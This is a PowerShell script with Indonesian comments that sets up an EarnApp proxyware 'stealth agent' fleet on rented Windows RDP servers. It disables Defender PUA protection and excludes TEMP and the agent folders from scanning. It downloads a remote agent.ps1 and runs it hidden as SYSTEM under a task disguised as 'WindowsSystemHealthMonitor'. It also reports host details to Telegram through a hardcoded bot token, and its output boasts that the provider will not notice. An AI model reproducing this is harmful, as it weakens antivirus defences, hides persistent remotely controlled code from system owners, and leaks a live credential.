# =========================================================================
#  EARNAPP WINDOWS RDP FLEET AUTOMATION & STEALTH AGENT (1-CLICK SETUP)
#  Repository: https://github.com/heru223/rdp-fleet-bot
#  Architecture: Outbound Stealth Agent (0 Open Ports / 100% Safe from Provider)
# =========================================================================

param(
    [string]$WorkerName = "",
    [string]$Folder = "RDP",
    [string]$MasterIP = "",
    [int]$MasterPort = 9090,
    [string]$BotToken = "8915903428:AAEciefmI7dRj5KH6KsWPK7--eOODNm34lg",
    [string]$ChatId = "1943547868",
    [switch]$NonInteractive = $false
)

$ErrorActionPreference = "Continue"

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " 🚀 EARNAPP WINDOWS RDP FLEET SETUP & STEALTH AGENT 🎮" -ForegroundColor Green
Write-Host " 🔒 Architecture: Outbound Agent (NOL Port Terbuka / Aman)" -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Pastikan Run as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "⚠️ Script ini membutuhkan hak Administrator untuk konfigurasi power & scheduler." -ForegroundColor Yellow
    Write-Host "⏳ Membuka kembali sebagai Administrator..." -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -WorkerName `"$WorkerName`" -Folder `"$Folder`" -MasterIP `"$MasterIP`" -MasterPort $MasterPort" -Verb RunAs
    exit
}

# 2. Whitelist Windows Defender & PUA Protection
Write-Host "`n[🛡️ 1/6 ANTIVIRUS WHITELIST] Menambahkan Whitelist Windows Defender..." -ForegroundColor Yellow
try {
    # Whitelist direktori EarnApp & Agent
    $exclusions = @(
        "C:\Program Files (x86)\EarnApp",
        "C:\Program Files\EarnApp",
        "$env:APPDATA\EarnApp",
        "$env:LOCALAPPDATA\EarnApp",
        "$env:ProgramData\EarnApp",
        "$env:ProgramData\WinNetworkMonitor",
        "$env:TEMP"
    )
    foreach ($f in $exclusions) {
        if (-not (Test-Path $f)) { New-Item -ItemType Directory -Path $f -Force -ErrorAction SilentlyContinue | Out-Null }
    }

    # Tambahkan exclusion path & proses resmi EarnApp
    Add-MpPreference -ExclusionPath $exclusions -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "earnapp.exe", "EarnApp.exe", "EarnAppSetup.exe" -ErrorAction SilentlyContinue

    # Set PUA Protection ke 0 agar EarnApp proxyware tidak diflag
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue

    Write-Host "  ✅ Whitelist Defender berhasil diterapkan (EarnApp bebas blokir PUA)." -ForegroundColor Green
} catch {
    Write-Host "  ℹ️ Defender note: $_" -ForegroundColor Gray
}

# 3. Deteksi Info Sistem & IP
Write-Host "`n[🌐 2/6 SYSTEM INFO] Mengambil informasi sistem & jaringan..." -ForegroundColor Yellow
$publicIp = "Unknown"
try {
    $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
} catch {
    try { $publicIp = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim() } catch {}
}

$os = Get-CimInstance Win32_OperatingSystem
$totalRamMb = [math]::Round($os.TotalVisibleMemorySize / 1024)
$freeRamMb = [math]::Round($os.FreePhysicalMemory / 1024)
$usedRamMb = $totalRamMb - $freeRamMb
$ramPct = if ($totalRamMb -gt 0) { [math]::Round(($usedRamMb / $totalRamMb) * 100) } else { 0 }
$ramStr = "$usedRamMb MB / $totalRamMb MB ($ramPct`%)"
$hostname = $env:COMPUTERNAME

# Konfigurasi Folder
if ([string]::IsNullOrWhiteSpace($Folder)) {
    $Folder = "RDP"
} else {
    $Folder = (Get-Culture).TextInfo.ToTitleCase($Folder.Trim().ToLower())
}

# Konfigurasi WorkerName
if ([string]::IsNullOrWhiteSpace($WorkerName)) {
    $defaultName = "$Folder-$hostname"
    if ($NonInteractive -or -not [Environment]::UserInteractive) {
        $WorkerName = $defaultName
    } else {
        Write-Host "`n🏷️ Masukkan Nama Worker RDP (Tekan [ENTER] untuk default: $defaultName): " -NoNewline -ForegroundColor Cyan
        $inputName = Read-Host
        if (-not [string]::IsNullOrWhiteSpace($inputName)) {
            $WorkerName = $inputName.Trim()
        } else {
            $WorkerName = $defaultName
        }
    }
}
Write-Host "   Worker Name : $WorkerName" -ForegroundColor Green
Write-Host "   Folder      : $Folder" -ForegroundColor Green

# Master IP
if ([string]::IsNullOrWhiteSpace($MasterIP)) {
    if ([Environment]::UserInteractive -and -not $NonInteractive) {
        Write-Host "`n🌐 Masukkan IP VPS Master Anda (Contoh: 47.237.82.102): " -NoNewline -ForegroundColor Cyan
        $inputMaster = Read-Host
        if (-not [string]::IsNullOrWhiteSpace($inputMaster)) {
            $MasterIP = $inputMaster.Trim()
        }
    }
}

# 4. Pengecekan & Instalasi EarnApp (Sudah Ada atau Belum)
Write-Host "`n[🔍 3/6 EARNAPP CHECK] Memeriksa status instalasi EarnApp..." -ForegroundColor Yellow
$nodeId = ""
$isInstalled = $false

# Cek proses berjalan
$proc = Get-Process -Name "*earnapp*" -ErrorAction SilentlyContinue
if ($proc) {
    $isInstalled = $true
    Write-Host "✅ Proses EarnApp terdeteksi sedang berjalan." -ForegroundColor Green
}

# Cek direktori umum
$searchPaths = @(
    "C:\Program Files (x86)\EarnApp",
    "C:\Program Files\EarnApp",
    "$env:APPDATA\EarnApp",
    "$env:LOCALAPPDATA\EarnApp",
    "$env:ProgramData\EarnApp"
)

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        $isInstalled = $true
        $uuidFile = Join-Path $path "uuid"
        if (Test-Path $uuidFile) {
            $content = (Get-Content $uuidFile -Raw).Trim()
            if ($content -match "sdk-node-") { $nodeId = $content }
        }
        $statusFile = Join-Path $path "status.json"
        if (Test-Path $statusFile -and [string]::IsNullOrEmpty($nodeId)) {
            $content = Get-Content $statusFile -Raw
            if ($content -match '(sdk-node-[a-zA-Z0-9_-]+)') { $nodeId = $matches[1] }
        }
    }
}

# Cek Registry jika belum dapat UUID
if ([string]::IsNullOrEmpty($nodeId)) {
    $regPaths = @(
        "HKCU:\Software\EarnApp",
        "HKLM:\Software\EarnApp",
        "HKCU:\Software\BrightData",
        "HKLM:\Software\WOW6432Node\EarnApp"
    )
    foreach ($r in $regPaths) {
        if (Test-Path $r) {
            $isInstalled = $true
            $val = (Get-ItemProperty -Path $r -Name "uuid" -ErrorAction SilentlyContinue).uuid
            if ($val -and $val -match "sdk-node-") { $nodeId = $val; break }
            $val2 = (Get-ItemProperty -Path $r -Name "node_id" -ErrorAction SilentlyContinue).node_id
            if ($val2 -and $val2 -match "sdk-node-") { $nodeId = $val2; break }
        }
    }
}

if ($isInstalled) {
    Write-Host "✔ EarnApp SUDAH TERPASANG. Konfigurasi lama dipertahankan (Tidak ditimpa)." -ForegroundColor Green
    if ($nodeId) {
        Write-Host "🆔 Node ID Ditemukan: $nodeId" -ForegroundColor Cyan
    } else {
        Write-Host "⚠️ Node ID sedang sinkronisasi dengan aplikasi..." -ForegroundColor Yellow
    }
} else {
    Write-Host "ℹ️ EarnApp BELUM terpasang di RDP ini. Memulai proses download & install..." -ForegroundColor Yellow
    $installerPath = "$env:TEMP\EarnAppSetup.exe"
    try {
        Write-Host "⏳ Mengunduh installer EarnApp..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri "https://cdn-earnapp.b-cdn.net/static/earnapp.exe" -OutFile $installerPath -TimeoutSec 30 -ErrorAction SilentlyContinue
    } catch {}
    
    if (Test-Path $installerPath) {
        Unblock-File -Path $installerPath -ErrorAction SilentlyContinue
        Write-Host "⚙️ Menjalankan installer EarnApp..." -ForegroundColor Cyan
        Start-Process $installerPath -ArgumentList "/S" -Wait
        
        Start-Sleep -Seconds 5
        foreach ($path in $searchPaths) {
            $uuidFile = Join-Path $path "uuid"
            if (Test-Path $uuidFile) {
                $content = (Get-Content $uuidFile -Raw).Trim()
                if ($content -match "sdk-node-") { $nodeId = $content; break }
            }
        }
    } else {
        Write-Host "⚠️ Silakan install EarnApp melalui browser jika installer gagal diunduh." -ForegroundColor Yellow
    }
}

# 5. Optimasi Windows RDP (Anti-Sleep, 24/7 Keep-Alive, Auto-Reboot 24h)
Write-Host "`n[⚡ 4/6 OPTIMASI RDP] Menerapkan Optimasi Windows RDP 24/7..." -ForegroundColor Yellow

# A. Power Plan High Performance (Anti-Sleep / Never Hibernate)
try {
    powercfg /change standby-timeout-ac 0 2>$null
    powercfg /change monitor-timeout-ac 0 2>$null
    powercfg /change disk-timeout-ac 0 2>$null
    powercfg /change hibernate-timeout-ac 0 2>$null
    Write-Host "  ✅ Power Plan: Sleep & Standby dinonaktifkan (Always ON)." -ForegroundColor Green
} catch {}

# B. RDP Disconnect Session Keep-Alive Shortcut
$desktopPath = [Environment]::GetFolderPath("Desktop")
$batContent = @"
@echo off
:: Disconnect RDP and transfer session to Console (keeps GUI & EarnApp alive 24/7)
for /f "skip=1 tokens=3" %%s in ('query user %USERNAME%') do (%windir%\System32\tscon.exe %%s /dest:console)
"@
Set-Content -Path "$desktopPath\Disconnect-RDP.bat" -Value $batContent
Write-Host "  ✅ Shortcut 'Disconnect-RDP.bat' dibuat di Desktop RDP." -ForegroundColor Green

# C. Auto-Reboot Rutin 24 Jam (Task Scheduler)
try {
    $action = New-ScheduledTaskAction -Execute "shutdown.exe" -Argument "/r /t 30 /f /c `"Daily 24h Auto-Reboot Routine`""
    $trigger = New-ScheduledTaskTrigger -Daily -At 04:00AM
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "EarnApp-Daily-Reboot" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host "  ✅ Task Scheduler: Auto-reboot 24 jam sekali terjadwal (04:00 AM)." -ForegroundColor Green
} catch {}

# 6. Pasang Stealth Outbound Health Agent (NOL Port Terbuka!)
Write-Host "`n[🔒 5/6 STEALTH AGENT] Memasang Outbound Background Health Agent..." -ForegroundColor Yellow
$agentDir = "C:\ProgramData\WinNetworkMonitor"
if (-not (Test-Path $agentDir)) { New-Item -ItemType Directory -Path $agentDir -Force | Out-Null }

$agentConfig = @{
    WorkerName = $WorkerName
    Folder = $Folder
    MasterIP = $MasterIP
    MasterPort = $MasterPort
    PublicIP = $publicIp
    NodeID = $nodeId
} | ConvertTo-Json -Indent 2
Set-Content -Path "$agentDir\config.json" -Value $agentConfig -Force

# Unduh agent.ps1 dari GitHub
$agentUrl = "https://raw.githubusercontent.com/heru223/rdp-fleet-bot/main/agent.ps1"
try {
    Invoke-WebRequest -Uri $agentUrl -OutFile "$agentDir\agent.ps1" -TimeoutSec 15 -ErrorAction SilentlyContinue
} catch {}

if (-not (Test-Path "$agentDir\agent.ps1")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile($agentUrl, "$agentDir\agent.ps1")
    } catch {}
}

# Pasang Task Scheduler tersamar (Nama wajar sistem: WindowsSystemHealthMonitor)
try {
    $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$agentDir\agent.ps1`""
    $trg1 = New-ScheduledTaskTrigger -AtStartup
    $trg2 = New-ScheduledTaskTrigger -Daily -At 12:00AM
    $prn = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $stg = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0)
    Register-ScheduledTask -TaskName "WindowsSystemHealthMonitor" -Action $act -Trigger @($trg1, $trg2) -Principal $prn -Settings $stg -Force -ErrorAction SilentlyContinue | Out-Null
    Start-ScheduledTask -TaskName "WindowsSystemHealthMonitor" -ErrorAction SilentlyContinue
    Write-Host "  ✅ Stealth Agent 'WindowsSystemHealthMonitor' aktif di background." -ForegroundColor Green
    Write-Host "     (Melapor berkala tiap 15s ke Master VPS tanpa membuka port apapun!)." -ForegroundColor Gray
} catch {
    Write-Host "  ℹ️ Menjalankan agent via process background..." -ForegroundColor Gray
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$agentDir\agent.ps1`""
}

# 7. Kirim Notifikasi Telegram Langsung & Registrasi ke Master
Write-Host "`n[📱 6/6 NOTIFIKASI TELEGRAM] Mengirim notifikasi & link klaim..." -ForegroundColor Yellow

$claimUrl = if ($nodeId -and $nodeId -match "sdk-node-") { "https://earnapp.com/r/$nodeId" } else { "Belum terdeteksi (Buka aplikasi EarnApp di RDP)" }
$statusNote = if ($isInstalled) { "Sudah Aktif Sebelumnya" } else { "Baru Diinstall" }
$nodeIdDisplay = if ($nodeId) { $nodeId } else { "Menunggu inisialisasi..." }

$tgMsg = @"
💻 <b>[WINDOWS RDP WORKER CONNECTED]</b>
━━━━━━━━━━━━━━━━━━━━━
🏷️ <b>Worker:</b> <b>$WorkerName</b> [📁 $Folder]
🖥️ <b>Host:</b> <code>$hostname</code> ($($os.Caption))
🌐 <b>IP RDP:</b> <code>$publicIp</code>
💾 <b>RAM:</b> <code>$ramStr</code>
📦 <b>Status EarnApp:</b> <b>$statusNote</b>

🆔 <b>Node ID:</b> <code>$nodeIdDisplay</code>
🔗 <b>Claim Link:</b> $claimUrl

🔒 <b>Port Masuk:</b> 🟢 0 Port Terbuka (100% Aman & Stealth)
📡 <b>Health Agent:</b> 🟢 Aktif (Heartbeat 15s)
🛡️ <b>RDP Keep-Alive:</b> 🟢 Aktif
🔄 <b>Auto-Reboot 24h:</b> 🟢 Terjadwal (04:00 AM)
━━━━━━━━━━━━━━━━━━━━━
"@

$buttons = @()
if ($nodeId -and $nodeId -match "sdk-node-") {
    $buttons += @(@{ text = "🔗 Klaim ke Akun EarnApp"; url = "https://earnapp.com/r/$nodeId" })
}
$buttons += @(@{ text = "📊 Buka Bot RDP"; url = "https://t.me/RdpfleetBot" })
$markup = @{ inline_keyboard = $buttons } | ConvertTo-Json -Compress

$tgUrl = "https://api.telegram.org/bot$BotToken/sendMessage"
$tgPayload = @{
    chat_id = $ChatId
    text = $tgMsg
    parse_mode = "HTML"
    reply_markup = $markup
}

try {
    $res = Invoke-RestMethod -Uri $tgUrl -Method Post -Body $tgPayload -TimeoutSec 10
    if ($res.ok) {
        Write-Host "  ✅ Berhasil mengirimkan detail worker ke Telegram!" -ForegroundColor Green
    }
} catch {
    Write-Host "  ⚠️ Gagal mengirim ke Telegram: $_" -ForegroundColor Yellow
}

# 8. Selesai
Write-Host "`n🎉 SETUP RDP STEALTH SELESAI!" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " Worker  : $WorkerName ($publicIp)" -ForegroundColor White
Write-Host " Claim   : $claimUrl" -ForegroundColor Cyan
Write-Host " Keamanan: 0 Port Terbuka (Penyedia RDP tidak akan tahu)" -ForegroundColor Green
Write-Host " Kontrol : Bisa reboot & restart EarnApp via Bot Telegram" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Cyan

if ([Environment]::UserInteractive -and -not $NonInteractive) {
    Write-Host "`nTekan [ENTER] untuk menutup jendela ini (atau langsung tutup jendela RDP)..."
    Read-Host
}
